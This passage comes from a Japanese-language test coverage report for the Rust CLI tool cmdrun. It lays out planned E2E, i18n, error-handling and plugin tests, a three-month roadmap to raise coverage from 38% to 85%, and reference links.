- `CmdrunTestEnv` 構造体実装
- 基本的なワークフローテスト追加

**5. i18nテスト追加**
- `tests/unit_i18n.rs` 作成
- 全言語の翻訳完全性テスト
- フォールバック機能テスト

**6. エラーハンドリングテスト追加**
- `tests/integration/error_handling.rs` 作成
- タイムアウト処理テスト
- 循環依存検出テスト

---

### 今月中に完了

**7. カバレッジ55%達成 (Phase 1完了)**
- env/history/i18n/mainモジュールのテスト追加
- CI/CDでの自動検証

**8. プラグインテスト完備**
- `tests/integration/plugin_commands.rs` 作成
- 完全なライフサイクルテスト

**9. ベンチマーク自動化**
- CI/CDパイプライン統合
- 起動時間・メモリ使用量の自動検証

---

## 📌 総括

### 🎯 現状の強み

cmdrunプロジェクトは**セキュリティとProperty-based testingにおいて業界トップクラス**の実装を持っています。

**特筆すべき点**:
1. **セキュリティテスト** (`tests/security/injection.rs`)
   - 18種類の攻撃パターン網羅
   - OWASP Top 10準拠
   - 3層のセキュリティ検証

2. **Property-based Testing** (`tests/proptest_coverage.rs`)
   - 24のプロパティテスト
   - 堅牢性・不変性・セキュリティプロパティの検証
   - 想定外の入力に対する耐性保証

3. **統合テスト** (`tests/integration/`)
   - 環境管理の包括的テスト (232行)
   - Watch機能の詳細検証 (33ケース)
   - 実用的なシナリオカバレッジ

---

### 🔧 改善の鍵

既存の高品質なテストパターンを**CLIコマンド層とi18n層に水平展開**することが最も効果的です。

**優先順位**:
1. 🔴 **E2Eテストフレームワーク構築** (最優先)
   - ユーザー視点での動作保証
   - 既存テストとの統合

2. 🔴 **i18n完全性テスト** (セキュリティ次ぐ重要性)
   - 翻訳漏れ防止
   - 多言語品質保証

3. 🟡 **未テストモジュールのカバレッジ向上**
   - env/history/completion/plugin
   - 段階的な実装

---

### 📈 達成可能な目標

**3ヶ月以内にカバレッジ85%を達成可能**

- **1ヶ月目**: 38% → 55% (Phase 1)
- **2ヶ月目**: 55% → 70% (Phase 2)
- **3ヶ月目**: 70% → 85% (Phase 3)

**合計工数**: 約34営業日（7週間）

---

### 🎁 期待される成果

1. **エンタープライズグレードの品質保証体制確立**
   - CI/CDでの自動品質チェック
   - リリース前の網羅的検証

2. **ユーザー信頼性の向上**
   - セキュリティ保証
   - 多言語サポートの完全性

3. **開発効率の向上**
   - リグレッション防止
   - リファクタリングの安全性保証

---

## 📚 参考資料

### テストフレームワーク
- [proptest](https://github.com/proptest-rs/proptest) - Property-based testing
- [criterion](https://github.com/bheisler/criterion.rs) - ベンチマーク
- [tarpaulin](https://github.com/xd009642/tarpaulin) - カバレッジ測定

### ベストプラクティス
- [Rust Testing Guide](https://doc.rust-lang.org/book/ch11-00-testing.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Property-based Testing Patterns](https://github.com/BurntSushi/quickcheck)

### CI/CD統合
- [GitHub Actions for Rust](https://github.com/actions-rs)
- [Codecov Integration](https://about.codecov.io/)

---

**レポート作成日**: 2025-11-10
**次回レビュー推奨日**: 2025-12-10 (1ヶ月後)
